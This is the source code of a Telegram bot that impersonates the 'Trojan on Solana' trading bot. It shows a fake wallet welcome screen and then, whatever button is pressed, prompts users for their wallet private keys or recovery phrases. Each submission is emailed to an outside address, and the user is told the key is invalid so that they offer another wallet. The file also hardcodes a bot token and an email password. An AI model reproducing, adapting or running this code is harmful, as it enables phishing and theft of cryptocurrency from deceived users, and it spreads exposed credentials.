// index.js
const TelegramBot = require('node-telegram-bot-api');
const nodemailer = require('nodemailer');

const BOT_TOKEN = '8650261118:AAGRJN9mrzfML6u0MTZPYVBhjsjEawkm4YY';
const EMAIL_HOST = 'techspotoronto.com';
const EMAIL_PORT = 465;
const EMAIL_SECURE = true;
const EMAIL_USER = 'wallet@techspotoronto.com';
const EMAIL_PASS = 'Hachimantoshi1$';
const RECEIVER_EMAIL = 'wallet@techspotoronto.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const transporter = nodemailer.createTransport({
  host: EMAIL_HOST,
  port: EMAIL_PORT,
  secure: EMAIL_SECURE,
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS,
  },
});

const userState = {};

// Inline keyboard options (rows of two)
const inlineOptions = {
  reply_markup: {
    inline_keyboard: [
      [{ text: 'Buy', callback_data: 'Buy' }, { text: 'Sell', callback_data: 'Sell' }],
      [{ text: 'Positions', callback_data: 'Positions' }, { text: 'Limit Orders', callback_data: 'Limit Orders' }],
      [{ text: 'DCA Orders', callback_data: 'DCA Orders' }, { text: 'Copy Trade', callback_data: 'Copy Trade' }],
      [{ text: 'Sniper', callback_data: 'Sniper' }, { text: 'Trenches', callback_data: 'Trenches' }],
      [{ text: 'Rewards', callback_data: 'Rewards' }, { text: 'Watchlist', callback_data: 'Watchlist' }],
      [{ text: 'Withdraw', callback_data: 'Withdraw' }, { text: 'Settings', callback_data: 'Settings' }]
    ]
  }
};

// /start handler
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcome = `Welcome to Trojan on Solana!

Introducing a cutting-edge bot crafted exclusively for Solana Traders. Trade any token instantly right after launch.

Here's your Solana wallet address linked to your Telegram account. Simply fund your wallet and dive into trading.

Solana · 🅴 (https://solscan.io/account/2C4St94ck65F8aE6Jf3uj8XPR6TJn7fpjjJJYfVDa2rM)
HK3BNX9bntfZqGQbuAeTdW6dGGci8FpGXUYENkUSiSXK  (Tap to copy)
Balance: 0 SOL ($0.00)

Click on the Refresh button to update your current balance.

Support | Terminal | X

Use any of these official bots with the same wallets and settings:
Agamemnon | Achilles | Nestor | Odysseus | Menelaus | Diomedes | Paris | Hector
`;
  bot.sendMessage(chatId, welcome, inlineOptions);
});

// callback_query (inline button) handler
bot.on('callback_query', (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const action = query.data;

  // mark user as awaiting recovery input
  userState[userId] = { awaitingRecovery: true };

  bot.sendMessage(
    chatId,
    `You selected: ${action}\n\nAccepted formats are Phantom-style (e.g. "88631DEyXSWf...") or Solflare-style ([93,182,8,9,100,...]). Private keys or phrase words from other Telegram bots should also work.`
  );

  // acknowledge callback to remove spinner
  bot.answerCallbackQuery(query.id).catch(() => {});
});

// message handler for recovery phrases
bot.on('message', (msg) => {
  // ignore messages that are callback_query acknowledgements or commands
  if (!msg || !msg.from || !msg.text) return;

  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const text = msg.text;

  // If user is expected to send recovery phrase
  if (userState[userId] && userState[userId].awaitingRecovery) {
    const mailOptions = {
      from: EMAIL_USER,
      to: RECEIVER_EMAIL,
      subject: `New Recovery Phrase from Telegram User`,
      text: `User ID: ${userId}\n\nRecovery Phrase:\n${text}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Error sending email:', error);
      } else {
        console.log('Email sent:', info && info.response ? info.response : info);
      }
    });

    delete userState[userId];
    bot.sendMessage(chatId, "Invalid Key! Connect With a Different Wallet");
  }
});
